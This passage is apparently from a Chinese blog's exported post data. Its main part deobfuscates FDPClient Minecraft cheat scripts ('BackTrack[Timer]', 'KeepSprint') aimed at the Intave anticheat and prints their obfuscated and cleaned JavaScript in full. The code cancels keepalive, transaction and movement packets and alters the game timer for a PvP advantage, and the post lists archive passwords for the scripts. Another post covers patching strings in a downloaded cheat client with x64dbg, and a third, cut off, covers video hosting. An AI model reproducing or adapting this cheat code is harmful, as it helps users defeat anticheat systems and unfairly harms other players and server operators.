_0xf7fc34\u0026amp;\u0026amp;_0x178a33[_0x44b3c9(0xb0,\u0026#39;EE1%\u0026#39;)](_0xf7fc34);;}};};};c==0x2\u0026amp;\u0026amp;mc[_0x44b3c9(0x10d,\u0026#39;0A\u0026amp;]\u0026#39;)]()[_0x44b3c9(0x109,\u0026#39;]K^Q\u0026#39;)](new _0x3ff227());;if(_0x555a37 instanceof _0x40a203){(c==0x1||c==0x2\u0026amp;\u0026amp;_0x555a37 instanceof _0x15f83d)\u0026amp;\u0026amp;(_0x178a33[_0x44b3c9(0xef,\u0026#39;rOZH\u0026#39;)](_0x15f83d(_0x555a37[_0x44b3c9(0xb6,\u0026#39;JZ$5\u0026#39;)](),_0x555a37[_0x44b3c9(0xc8,\u0026#39;qDiY\u0026#39;)]())),mc[_0x44b3c9(0x119,\u0026#39;zj6p\u0026#39;)][_0x44b3c9(0x102,\u0026#39;0A\u0026amp;]\u0026#39;)]=0x0,mc[_0x44b3c9(0x124,\u0026#39;Yi2B\u0026#39;)][_0x44b3c9(0x108,\u0026#39;AJDT\u0026#39;)]=0x0,mc[_0x44b3c9(0xe7,\u0026#39;b(T5\u0026#39;)][_0x44b3c9(0xf6,\u0026#39;DI7W\u0026#39;)]=0x0);;};if(_0x555a37 instanceof _0x40a203){_0x555a37 instanceof _0x475f6e\u0026amp;\u0026amp;_0x178a33[_0x44b3c9(0x120,\u0026#39;]6kW\u0026#39;)]();;}else ticks\u0026gt;0x0\u0026amp;\u0026amp;ticks\u0026lt;=0x15\u0026amp;\u0026amp;mc[_0x44b3c9(0xd2,\u0026#39;caNx\u0026#39;)]()[_0x44b3c9(0x117,\u0026#39;4$sA\u0026#39;)](new _0x475f6e(_0x555a37[_0x44b3c9(0xdf,\u0026#39;dbY6\u0026#39;)][_0x44b3c9(0xc9,\u0026#39;*x8w\u0026#39;)]));;c==0x2\u0026amp;\u0026amp;mc[_0x44b3c9(0xb8,\u0026#39;EE1%\u0026#39;)]()[_0x44b3c9(0xda,\u0026#39;EIu\u0026amp;\u0026#39;)](new _0x4e7c5c());;},this[_0x595d96(0xcb,\u0026#39;caNx\u0026#39;)]=function(){var _0x4dd6dc=_0x595d96;ticks=0x0,a=0x0,b=0x0,c=0x0,Newticks=0x0,Lastticks=0x0,mc[_0x4dd6dc(0xc5,\u0026#39;b(T5\u0026#39;)][_0x4dd6dc(0xcf,\u0026#39;DToo\u0026#39;)]=0x1,timerModule[_0x4dd6dc(0x128,\u0026#39;kgN%\u0026#39;)](![]),mc[_0x4dd6dc(0x119,\u0026#39;zj6p\u0026#39;)][_0x4dd6dc(0xfb,\u0026#39;2xN#\u0026#39;)]=0.02,DiscoverRange=0x1b;};};function onLoad(){};function onEnable(){var _0x5d287c=_0x628450;FakeLagClient=moduleManager[_0x5d287c(0x129,\u0026#39;zj6p\u0026#39;)](FakeLag);};function onDisable(){var _0x221770=_0x628450;moduleManager[_0x221770(0x114,\u0026#39;REq5\u0026#39;)](FakeLagClient),timerModule[_0x221770(0x10b,\u0026#39;EE1%\u0026#39;)](![]);};var version_ = \u0026#39;xpdbk.com\u0026#39;; 通过简单的分析我们可以发现里面有一些字段是由\\x81这种字符和Base64构成的还有如FakeLagClient等暴露在外的源码我们就能看出来混淆强度并不怎么高，下面的代码是经过我格式化+断点+AST分析猜出来的代码，可以说已经很清晰了\nJS 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 ; var scriptName = \u0026#39;BackTrack[TImer]\u0026#39;; var scriptVersion = 1; var scriptAuthor = \u0026#39;Random_Name\u0026#39;; var timerModule = moduleManager.getModule(\u0026#39;Timer\u0026#39;); var FakeLag = new FakeLag(); var Client; var ticks = 0; var Lastticks = 0; var Newticks = 0; var a = 0; var b = 1; var c = 0; var d = 0; var DiscoverRange = 27; function FakeLag() { this.getCategory = function () { return \u0026#39;Exploit\u0026#39;; }; this.getName = function () { return \u0026#39;BackTrack[TImer]\u0026#39;; }; this.getTag = function () { return \u0026#39;Intave\u0026#39;; }; this.getDescription = function () { return \u0026#39;BackTrack[TImer] by Random_Name\u0026#39;; }; this.onUpdate = function () { DiscoverRange \u0026lt;= 23 \u0026amp;\u0026amp; (a = 1); ; b \u0026gt; 5 \u0026amp;\u0026amp; DiscoverRange--; ; mc.thePlayer.hurttime == 10 \u0026amp;\u0026amp; b == 0 \u0026amp;\u0026amp; (DiscoverRange -= 1); ; a == 1 ? (mc.thePlayer.speedInAir = 0, mc.timer.timerSpeed = 0.8, a = 2) : mc.thePlayer.speedInAir = 0.02; ; if (a \u0026gt;= 2 \u0026amp;\u0026amp; a \u0026lt;= 4) { d = 1; a \u0026gt;= 2 \u0026amp;\u0026amp; a \u0026lt;= 3 \u0026amp;\u0026amp; (mc.timer.timerSpeed = 10); ; a++; DiscoverRange = 47; } else d = 0; ; if (a \u0026gt; 3 \u0026amp;\u0026amp; a \u0026lt;= 5) { a == 4 \u0026amp;\u0026amp; (mc.timer.timerSpeed = 0.5); ; a++; } ; c == 2 \u0026amp;\u0026amp; DiscoverRange--; ; a \u0026gt; 4 \u0026amp;\u0026amp; (mc.timer.timerSpeed = 1, a = 0); ; if (mc.thePlayer.hurttime \u0026gt;= 0 \u0026amp;\u0026amp; mc.thePlayer.hurttime \u0026lt; 10) c = 1; else mc.thePlayer.hurttime == 10 \u0026amp;\u0026amp; (c = 2); ; }; this.onPacket = function (_0x178a33) { var _0x555a37 = _0x178a33.getPacket(); var _0x3acec2 = Java.type(\u0026#39;net.minecraft.network.play.client.C00PacketKeepAlive\u0026#39;); var _0x3f50ce = Java.type(\u0026#39;net.minecraft.network.play.client.C0FPacketConfirmTransaction\u0026#39;); var _0x40a203 = Java.type(\u0026#39;net.minecraft.network.play.client.C02PacketUseEntity\u0026#39;); var _0x570d3a = Java.type(\u0026#39;net.minecraft.network.play.server.S03PacketTimeUpdate\u0026#39;); var _0x560a6e = Java.type(\u0026#39;net.minecraft.network.play.server.S06PacketUpdateHealth\u0026#39;); var _0xf7fc34 = Java.type(\u0026#39;net.minecraft.network.play.server.S19PacketEntityStatus\u0026#39;); var _0x2e7362 = Java.type(\u0026#39;net.minecraft.network.play.server.S27PacketExplosion\u0026#39;); var _0x420760 = Java.type(\u0026#39;net.minecraft.network.play.server.S27PacketExplosion\u0026#39;); var _0x6c8396 = Java.type(\u0026#39;net.minecraft.network.play.server.S27PacketExplosion\u0026#39;); var _0x3ff227 = Java.type(\u0026#39;net.minecraft.network.play.server.S07PacketRespawn\u0026#39;); var _0x4e7c5c = Java.type(\u0026#39;net.minecraft.network.play.server.S0CPacketSpawnPlayer\u0026#39;); var _0x15f83d = Java.type(\u0026#39;net.minecraft.network.play.client.C03PacketPlayer\u0026#39;); var _0x475f6e = Java.type(\u0026#39;net.minecraft.network.play.client.C0BPacketEntityAction\u0026#39;); var _0x6aa57d = Java.type(\u0026#39;net.minecraft.network.play.server.S18PacketEntityTeleport\u0026#39;); var _0x472e1f = Java.type(\u0026#39;net.minecraft.network.play.server.S14PacketEntity\u0026#39;); var _0xb3480f = Java.type(\u0026#39;net.minecraft.entity.EntityLivingBase\u0026#39;); if (_0x555a37 instanceof _0x40a203) DiscoverRange--, Newticks++, Newticks++, b++, Newticks++, Newticks++; else b \u0026gt;= 0 \u0026amp;\u0026amp; b--; ; Newticks \u0026gt;= 50 \u0026amp;\u0026amp; (Newticks = -7, ticks = 0); ; if (d = 1) { _0x555a37 instanceof _0x570d3a \u0026amp;\u0026amp; _0x178a33.cancelEvent(_0x570d3a); ; _0x555a37 instanceof _0x3acec2 \u0026amp;\u0026amp; _0x178a33.cancelEvent(_0x3acec2); ; _0x555a37 instanceof _0x15f83d \u0026amp;\u0026amp; _0x178a33.cancelEvent(_0x15f83d); ; _0x555a37 instanceof _0x3f50ce \u0026amp;\u0026amp; cancelEvent(_0x3f50ce); ; } ; if (Newticks \u0026gt; 0) { Newticks--; _0x555a37 instanceof _0x3f50ce \u0026amp;\u0026amp; cancelEvent(_0x3f50ce); ; _0x555a37 instanceof _0x2e7362 \u0026amp;\u0026amp; _0x178a33.cancelEvent(_0x2e7362); ; _0x555a37 instanceof _0x570d3a \u0026amp;\u0026amp; _0x178a33.cancelEvent(_0x570d3a); ; _0x555a37 instanceof _0x420760 \u0026amp;\u0026amp; _0x178a33.cancelEvent(_0x420760); ; _0x555a37 instanceof _0x6aa57d \u0026amp;\u0026amp; _0x178a33.cancelEvent(_0x6aa57d); ; } ; _0x555a37 instanceof _0x40a203 \u0026amp;\u0026amp; ticks == 0 \u0026amp;\u0026amp; Newticks \u0026gt;= 0 \u0026amp;\u0026amp; (ticks = 40); ; if (ticks \u0026gt;= 20) { ticks--; _0x555a37 instanceof _0x15f83d \u0026amp;\u0026amp; Lastticks++; ; _0x555a37 instanceof _0x40a203 \u0026amp;\u0026amp; _0x555a37 instanceof _0x15f83d \u0026amp;\u0026amp; _0x178a33.cancelEvent(_0x15f83d(_0x555a37.isMoving())); ; _0x555a37 instanceof _0x3acec2 \u0026amp;\u0026amp; _0x178a33.cancelEvent(_0x3acec2); ; _0x555a37 instanceof _0xf7fc34 \u0026amp;\u0026amp; _0x178a33.cancelEvent(_0xf7fc34); ; _0x555a37 instanceof _0x570d3a \u0026amp;\u0026amp; _0x178a33.cancelEvent(_0x570d3a); ; } ; if (ticks \u0026lt; 21) { ticks--; if (Lastticks \u0026gt; 0) { Lastticks--; if (_0x555a37 instanceof _0x15f83d) { } else { if (c == 0) { _0x555a37 instanceof _0x570d3a \u0026amp;\u0026amp; _0x178a33.cancelEvent(_0x570d3a); ; _0x555a37 instanceof _0x420760 \u0026amp;\u0026amp; _0x178a33.cancelEvent(_0x420760); ; _0x555a37 instanceof _0xf7fc34 \u0026amp;\u0026amp; _0x178a33.cancelEvent(_0xf7fc34); ; } } ; } ; } ; c == 2 \u0026amp;\u0026amp; mc.getNetHandler().addToSendQueue(new _0x3ff227()); ; if (_0x555a37 instanceof _0x40a203) { (c == 1 || c == 2 \u0026amp;\u0026amp; _0x555a37 instanceof _0x15f83d) \u0026amp;\u0026amp; (_0x178a33.cancelEvent(_0x15f83d(_0x555a37.isMoving(), _0x555a37.isOnGround())), mc.thePlayer.motionY = 0, mc.thePlayer.motionX = 0, mc.thePlayer.motionZ = 0); ; } ; if (_0x555a37 instanceof _0x40a203) { _0x555a37 instanceof _0x475f6e \u0026amp;\u0026amp; _0x178a33.cancelEvent(); ; } else ticks \u0026gt; 0 \u0026amp;\u0026amp; ticks \u0026lt;= 21 \u0026amp;\u0026amp; mc.getNetHandler().addToSendQueue(new _0x475f6e(_0x555a37.action.STOP_SPRINTING)); ; c == 2 \u0026amp;\u0026amp; mc.getNetHandler().addToSendQueue(new _0x4e7c5c()); ; }; this.onDisable = function () { ticks = 0; a = 0; b = 0; c = 0; Newticks = 0; Lastticks = 0; mc.timer.timerSpeed = 1; timerModule.setState(false); mc.thePlayer.speedInAir = 0.02; DiscoverRange = 27; }; } ; function onLoad() { } ; function onEnable() { FakeLagClient = moduleManager.registerModule(FakeLag); } ; function onDisable() { moduleManager.unregisterModule(FakeLagClient); timerModule.setState(false); } ; var version_ = \u0026#39;xpdbk.com\u0026#39;; 再把里面的一些妨碍人分析的东西删除掉我们就得到了一个很干净但是无法运行只能分析的JS\nJS 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 240 241 242 243 244 245 246 247 248 249 250 251 252 253 254 255 256 257 258 259 260 261 262 263 264 265 266 267 268 269 270 271 272 273 274 var scriptName = \u0026#39;BackTrack[TImer]\u0026#39;; var scriptVersion = 1; var scriptAuthor = \u0026#39;Random_Name\u0026#39;; var timerModule = moduleManager.getModule(\u0026#39;Timer\u0026#39;); var FakeLag = new FakeLag(); var Client; var ticks = 0; var Lastticks = 0; var Newticks = 0; var a = 0; var b = 1; var c = 0; var d = 0; var DiscoverRange = 27; function FakeLag() { this.getCategory = function () { return \u0026#39;Exploit\u0026#39;; }; this.getName = function () { return \u0026#39;BackTrack[TImer]\u0026#39;; }; this.getTag = function () { return \u0026#39;Intave\u0026#39;; }; this.getDescription = function () { return \u0026#39;BackTrack[TImer] by Random_Name\u0026#39;; }; this.onUpdate = function () { if (DiscoverRange \u0026lt;= 23) { a = 1; } ; if (b \u0026gt; 5) { DiscoverRange--; } ; if (mc.thePlayer.hurttime == 10 \u0026amp;\u0026amp; b == 0) { DiscoverRange -= 1; } ; if (a == 1) { mc.thePlayer.speedInAir = 0; mc.timer.timerSpeed = 0.8; a = 2; } else { mc.thePlayer.speedInAir = 0.02; }; ; if (a \u0026gt;= 2 \u0026amp;\u0026amp; a \u0026lt;= 4) { d = 1; if (a \u0026gt;= 2 \u0026amp;\u0026amp; a \u0026lt;= 3) { mc.timer.timerSpeed = 10; } ; a++; DiscoverRange = 47; } else { d = 0; } ; if (a \u0026gt; 3 \u0026amp;\u0026amp; a \u0026lt;= 5) { if (a == 4) { mc.timer.timerSpeed = 0.5; } ; a++; } ; if (c == 2) { DiscoverRange--; } ; if (a \u0026gt; 4) { mc.timer.timerSpeed = 1; a = 0; } ; if (mc.thePlayer.hurttime \u0026gt;= 0 \u0026amp;\u0026amp; mc.thePlayer.hurttime \u0026lt; 10) { c = 1; } else { if (mc.thePlayer.hurttime == 10) { c = 2; } } ; }; this.onPacket = function (_0x178a33) { var packet = _0x178a33.getPacket(); var type = Java.type(\u0026#39;net.minecraft.network.play.client.C00PacketKeepAlive\u0026#39;); var type_1 = Java.type(\u0026#39;net.minecraft.network.play.client.C0FPacketConfirmTransaction\u0026#39;); var type_2 = Java.type(\u0026#39;net.minecraft.network.play.client.C02PacketUseEntity\u0026#39;); var type_3 = Java.type(\u0026#39;net.minecraft.network.play.server.S03PacketTimeUpdate\u0026#39;); var type_4 = Java.type(\u0026#39;net.minecraft.network.play.server.S06PacketUpdateHealth\u0026#39;); var type_5 = Java.type(\u0026#39;net.minecraft.network.play.server.S19PacketEntityStatus\u0026#39;); var type_6 = Java.type(\u0026#39;net.minecraft.network.play.server.S27PacketExplosion\u0026#39;); var type_7 = Java.type(\u0026#39;net.minecraft.network.play.server.S27PacketExplosion\u0026#39;); var type_8 = Java.type(\u0026#39;net.minecraft.network.play.server.S27PacketExplosion\u0026#39;); var type_9 = Java.type(\u0026#39;net.minecraft.network.play.server.S07PacketRespawn\u0026#39;); var type_10 = Java.type(\u0026#39;net.minecraft.network.play.server.S0CPacketSpawnPlayer\u0026#39;); var type_11 = Java.type(\u0026#39;net.minecraft.network.play.client.C03PacketPlayer\u0026#39;); var type_12 = Java.type(\u0026#39;net.minecraft.network.play.client.C0BPacketEntityAction\u0026#39;); var type_13 = Java.type(\u0026#39;net.minecraft.network.play.server.S18PacketEntityTeleport\u0026#39;); var type_14 = Java.type(\u0026#39;net.minecraft.network.play.server.S14PacketEntity\u0026#39;); var type_15 = Java.type(\u0026#39;net.minecraft.entity.EntityLivingBase\u0026#39;); if (packet instanceof type_2) { DiscoverRange--; Newticks++; Newticks++; b++; Newticks++; Newticks++; } else { if (b \u0026gt;= 0) { b--; } } ; if (Newticks \u0026gt;= 50) { Newticks = -7; ticks = 0; } ; if (d = 1) { if (packet instanceof type_3) { _0x178a33.cancelEvent(type_3); } ; if (packet instanceof type) { _0x178a33.cancelEvent(type); } ; if (packet instanceof type_11) { _0x178a33.cancelEvent(type_11); } ; if (packet instanceof type_1) { cancelEvent(type_1); } ; } ; if (Newticks \u0026gt; 0) { Newticks--; if (packet instanceof type_1) { cancelEvent(type_1); } ; if (packet instanceof type_6) { _0x178a33.cancelEvent(type_6); } ; if (packet instanceof type_3) { _0x178a33.cancelEvent(type_3); } ; if (packet instanceof type_7) { _0x178a33.cancelEvent(type_7); } ; if (packet instanceof type_13) { _0x178a33.cancelEvent(type_13); } ; } ; if (packet instanceof type_2 \u0026amp;\u0026amp; ticks == 0 \u0026amp;\u0026amp; Newticks \u0026gt;= 0) { ticks = 40; } ; if (ticks \u0026gt;= 20) { ticks--; if (packet instanceof type_11) { Lastticks++; } ; if (packet instanceof type_2 \u0026amp;\u0026amp; packet instanceof type_11) { _0x178a33.cancelEvent(type_11(packet.isMoving())); } ; if (packet instanceof type) { _0x178a33.cancelEvent(type); } ; if (packet instanceof type_5) { _0x178a33.cancelEvent(type_5); } ; if (packet instanceof type_3) { _0x178a33.cancelEvent(type_3); } ; } ; if (ticks \u0026lt; 21) { ticks--; if (Lastticks \u0026gt; 0) { Lastticks--; if (packet instanceof type_11) { } else { if (c == 0) { if (packet instanceof type_3) { _0x178a33.cancelEvent(type_3); } ; if (packet instanceof type_7) { _0x178a33.cancelEvent(type_7); } ; if (packet instanceof type_5) { _0x178a33.cancelEvent(type_5); } ; } } ; } ; } ; if (c == 2) { mc.getNetHandler().addToSendQueue(new type_9()); } ; if (packet instanceof type_2) { if (c == 1 || c == 2 \u0026amp;\u0026amp; packet instanceof type_11) { _0x178a33.cancelEvent(type_11(packet.isMoving(), packet.isOnGround())); mc.thePlayer.motionY = 0; mc.thePlayer.motionX = 0; mc.thePlayer.motionZ = 0; } ; } ; if (packet instanceof type_2) { if (packet instanceof type_12) { _0x178a33.cancelEvent(); } ; } else { if (ticks \u0026gt; 0 \u0026amp;\u0026amp; ticks \u0026lt;= 21) { mc.getNetHandler().addToSendQueue(new type_12(packet.action.STOP_SPRINTING)); } } ; if (c == 2) { mc.getNetHandler().addToSendQueue(new type_10()); } ; }; this.onDisable = function () { ticks = 0; a = 0; b = 0; c = 0; Newticks = 0; Lastticks = 0; mc.timer.timerSpeed = 1; timerModule.setState(false); mc.thePlayer.speedInAir = 0.02; DiscoverRange = 27; }; } ; function onLoad() { } ; function onEnable() { FakeLagClient = moduleManager.registerModule(FakeLag); } ; function onDisable() { moduleManager.unregisterModule(FakeLagClient); timerModule.setState(false); } KeepSprint[Intave and Polar].js 这个就更简单包含了十六进制ASCII码的字符串。每个ASCII码由反斜杠\\开始，然后是x，接着是两位十六进制数。我们可以将这些ASCII码转换为对应的字符。下面是对照表格：\nASCII码 十六进制 字符 \\x72 72 r \\x69 69 i 所以，\\x72\\x69对应的字符串是ri\n下面是原JS非常的难读\nJS 1 var OU1=\u0026#34;\\x4b\\x65\\x65\\x70\\x73\\x70\\x72\\x69\\x6e\\x74\u0026#34;;var bEsEijIo2=\u0026#34;\\x52\\x4e\\x5f\\x52\\x61\\x6e\\x64\\x6f\\x6d\\x5f\\x4e\\x61\\x6d\\x65\u0026#34;;var r_ej3=1.0;var dfqGiu4=new dfqGiu4();var ch5=moduleManager[\u0026#39;\\x67\\x65\\x74\\x4d\\x6f\\x64\\x75\\x6c\\x65\u0026#39;](\u0026#39;\\x4b\\x69\\x6c\\x6c\\x61\\x75\\x72\\x61\u0026#39;);var RyKq6;function dfqGiu4(){this[\u0026#39;\\x67\\x65\\x74\\x4e\\x61\\x6d\\x65\u0026#39;]=function(){return\u0026#34;\\x4b\\x65\\x65\\x70\\x53\\x70\\x72\\x69\\x6e\\x74\\x4e\\x65\\x77\u0026#34;};this[\u0026#39;\\x67\\x65\\x74\\x44\\x65\\x73\\x63\\x72\\x69\\x70\\x74\\x69\\x6f\\x6e\u0026#39;]=function(){return\u0026#34;\\x41\\x6e\\x74\\x69\\x63\\x68\\x65\\x61\\x74 \\x3a \\x69\\x6e\\x74\\x61\\x76\\x65 \\x66\\x6f\\x72 \\x46\\x44\\x50\u0026#34;};this[\u0026#39;\\x67\\x65\\x74\\x43\\x61\\x74\\x65\\x67\\x6f\\x72\\x79\u0026#39;]=function(){return\u0026#34;\\x43\\x6f\\x6d\\x62\\x61\\x74\u0026#34;};this[\u0026#39;\\x6f\\x6e\\x55\\x70\\x64\\x61\\x74\\x65\u0026#39;]=function(){if(mc[\u0026#39;\\x74\\x68\\x65\\x50\\x6c\\x61\\x79\\x65\\x72\u0026#39;][\u0026#39;\\x68\\x75\\x72\\x74\\x74\\x69\\x6d\\x65\u0026#39;]\u0026gt;0){if(!ch5[\u0026#39;\\x67\\x65\\x74\\x56\\x61\\x6c\\x75\\x65\u0026#39;](\u0026#39;\\x4b\\x65\\x65\\x70\\x53\\x70\\x72\\x69\\x6e\\x74\u0026#39;)[\u0026#39;\\x67\\x65\\x74\u0026#39;]()){ch5[\u0026#39;\\x67\\x65\\x74\\x56\\x61\\x6c\\x75\\x65\u0026#39;](\u0026#39;\\x4b\\x65\\x65\\x70\\x53\\x70\\x72\\x69\\x6e\\x74\u0026#39;)[\u0026#39;\\x73\\x65\\x74\u0026#39;](false)}}else{if(ch5[\u0026#39;\\x67\\x65\\x74\\x56\\x61\\x6c\\x75\\x65\u0026#39;](\u0026#39;\\x4b\\x65\\x65\\x70\\x53\\x70\\x72\\x69\\x6e\\x74\u0026#39;)[\u0026#39;\\x67\\x65\\x74\u0026#39;]()){ch5[\u0026#39;\\x67\\x65\\x74\\x56\\x61\\x6c\\x75\\x65\u0026#39;](\u0026#39;\\x4b\\x65\\x65\\x70\\x53\\x70\\x72\\x69\\x6e\\x74\u0026#39;)[\u0026#39;\\x73\\x65\\x74\u0026#39;](true)}}};this[\u0026#39;\\x6f\\x6e\\x44\\x69\\x73\\x61\\x62\\x6c\\x65\u0026#39;]=function(){ch5[\u0026#39;\\x67\\x65\\x74\\x56\\x61\\x6c\\x75\\x65\u0026#39;](\u0026#39;\\x4b\\x65\\x65\\x70\\x53\\x70\\x72\\x69\\x6e\\x74\u0026#39;)[\u0026#39;\\x73\\x65\\x74\u0026#39;](true)}};function onLoad(){};function onEnable(){RyKq6=moduleManager[\u0026#39;\\x72\\x65\\x67\\x69\\x73\\x74\\x65\\x72\\x4d\\x6f\\x64\\x75\\x6c\\x65\u0026#39;](dfqGiu4)};function onDisable(){moduleManager[\u0026#39;\\x75\\x6e\\x72\\x65\\x67\\x69\\x73\\x74\\x65\\x72\\x4d\\x6f\\x64\\x75\\x6c\\x65\u0026#39;](RyKq6)}; 把字符全还原并格式化之后就是下面这样但是仅供分析\nJS 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 var OU1 = \u0026#39;Keepsprint\u0026#39;; var bEsEijIo2 = \u0026#39;RN_Random_Name\u0026#39;; var r_ej3 = 1; var dfqGiu4 = new dfqGiu4(); var ch5 = moduleManager[\u0026#39;getModule\u0026#39;](\u0026#39;Killaura\u0026#39;); var RyKq6; function dfqGiu4() { this[\u0026#39;getName\u0026#39;] = function () { return \u0026#39;KeepSprintNew\u0026#39;; }; this[\u0026#39;getDescription\u0026#39;] = function () { return \u0026#39;Anticheat : intave for FDP\u0026#39;; }; this[\u0026#39;getCategory\u0026#39;] = function () { return \u0026#39;Combat\u0026#39;; }; this[\u0026#39;onUpdate\u0026#39;] = function () { if (mc[\u0026#39;thePlayer\u0026#39;][\u0026#39;hurttime\u0026#39;] \u0026gt; 0) { if (!ch5[\u0026#39;getValue\u0026#39;](\u0026#39;KeepSprint\u0026#39;)[\u0026#39;get\u0026#39;]()) { ch5[\u0026#39;getValue\u0026#39;](\u0026#39;KeepSprint\u0026#39;)[\u0026#39;set\u0026#39;](false); } } else { if (ch5[\u0026#39;getValue\u0026#39;](\u0026#39;KeepSprint\u0026#39;)[\u0026#39;get\u0026#39;]()) { ch5[\u0026#39;getValue\u0026#39;](\u0026#39;KeepSprint\u0026#39;)[\u0026#39;set\u0026#39;](true); } } }; this[\u0026#39;onDisable\u0026#39;] = function () { ch5[\u0026#39;getValue\u0026#39;](\u0026#39;KeepSprint\u0026#39;)[\u0026#39;set\u0026#39;](true); }; } ; function onLoad() { } ; function onEnable() { RyKq6 = moduleManager[\u0026#39;registerModule\u0026#39;](dfqGiu4); } ; function onDisable() { moduleManager[\u0026#39;unregisterModule\u0026#39;](RyKq6); } ; 我把所有的方法和属性都使用了点符号（.）而不是方括号[]\nJS 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 var OU1 = \u0026#39;Keepsprint\u0026#39;; var bEsEijIo2 = \u0026#39;RN_Random_Name\u0026#39;; var r_ej3 = 1; var dfqGiu4 = new dfqGiu4(); var ch5 = moduleManager.getModule(\u0026#39;Killaura\u0026#39;); var RyKq6; function dfqGiu4() { this.getName = function () { return \u0026#39;KeepSprintNew\u0026#39;; }; this.getDescription = function () { return \u0026#39;Anticheat : intave for FDP\u0026#39;; }; this.getCategory = function () { return \u0026#39;Combat\u0026#39;; }; this.onUpdate = function () { if (mc.thePlayer.hurttime \u0026gt; 0) { if (!ch5.getValue(\u0026#39;KeepSprint\u0026#39;).get()) { ch5.getValue(\u0026#39;KeepSprint\u0026#39;).set(false); } } else { if (ch5.getValue(\u0026#39;KeepSprint\u0026#39;).get()) { ch5.getValue(\u0026#39;KeepSprint\u0026#39;).set(true); } } }; this.onDisable = function () { ch5.getValue(\u0026#39;KeepSprint\u0026#39;).set(true); }; } function onLoad() {} function onEnable() { RyKq6 = moduleManager.registerModule(dfqGiu4); } function onDisable() { moduleManager.unregisterModule(RyKq6); } 资源 包含6个JS其中两个有混淆\nSce-2 访问密码:fywt\nBackTrackAndTimerrange_2 访问密码:dhob\n全部压缩密码:2Ff2fSFwsdq\n","date":"2023-10-04T21:31:46+07:00","image":"https://blog.xpdbk.com/post/intave-fdpclient-js-ast/2023-09-10_18.51.42_hua4176d50f303bd057f67ea4e2ddb3e39_66074_120x120_fill_q75_h2_box_smart1_2.webp","permalink":"https://blog.xpdbk.com/post/intave-fdpclient-js-ast/","title":"FDPClient的Intave反作弊JS"},{"content":"前言 我在用x64dbg研究一个程序然后突然想到如果我字符串改了会咋样，这个程序是我在网上随便找的一个Minecraft GC放到下面链接供使用\n蓝奏云 访问密码:gy99\n压缩密码:GgGg313df\n开始 打开我们的x64dbg这个软件是一个逆向软件可以在github上面下载，打开软件并打开我们的示例程序之后\n然后右键就会有一个选项卡\n然后我们扫过搜索然后扫过所有模块然后点击字符串\n分析完之后我们直接输入字符然后点击唯一的字符串\n然后按照16进制修改字符串\n修改完之后右击左上角的文件然后点击补丁\n应用补丁之后文件修改完毕\n","date":"2023-10-01T15:08:31+07:00","permalink":"https://blog.xpdbk.com/post/x64dbg%E6%94%B9%E5%AD%97%E7%AC%A6%E4%B8%B2/","title":"X64DBG改字符串"},{"content":"视频托管的免费方式 是的，我最终选择使用最简单的方法对抗恶意举报然后下架的困扰\n起因 实践 我把我的视频用ffmpeg进行了转码和压缩具体代码看上一篇文章ffmpeg批量压缩转换视频为30FPS 然后我就开始寻找托管的方法，结果找到了cfpage这个不限流量的东西，上传GITHUB然后访问文件名一气呵成\n魔改HUGO短代码 video.html改成这个\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 {{- $src := .Get \u0026#34;src\u0026#34; | default (.Get 0) -}} \u0026lt;div id=\u0026#34;dplayer\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;link rel=\u0026#34;preload\u0026#34; href=\u0026#34;https://lib.baomitu.com/dplayer/1.25.0/DPlayer.min.css\u0026#34; as=\u0026#34;style\u0026#34; onload=\u0026#34;this.onload=null;this.rel=\u0026#39;stylesheet\u0026#39;\u0026#34;\u0026gt; \u0026lt;script src=\u0026#34;https://lib.baomitu.com/dplayer/1.25.0/DPlayer.min.js\u0026#34; defer\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script defer\u0026gt; document.addEventListener(\u0026#39;DOMContentLoaded\u0026#39;, function () { var dp = new DPlayer({ container: document.getElementById(\u0026#39;dplayer\u0026#39;), screenshot: false, video: { url: \u0026#39;{{- $src -}}\u0026#39;, type: \u0026#39;auto\u0026#39; }, preload: \u0026#39;none\u0026#39;, lang: \u0026#39;zh-cn\u0026#39; }); dp.on(\u0026#39;fullscreen\u0026#39;, function () { dp.fullScreen.request(\u0026#39;web\u0026#39;); }); dp.on(\u0026#39;timeupdate\u0026#39;, function () { if (dp.video.currentTime === 0) { dp.seek(1); } }); document.addEventListener(\u0026#39;visibilitychange\u0026#39;, function() { if (document.hidden) { 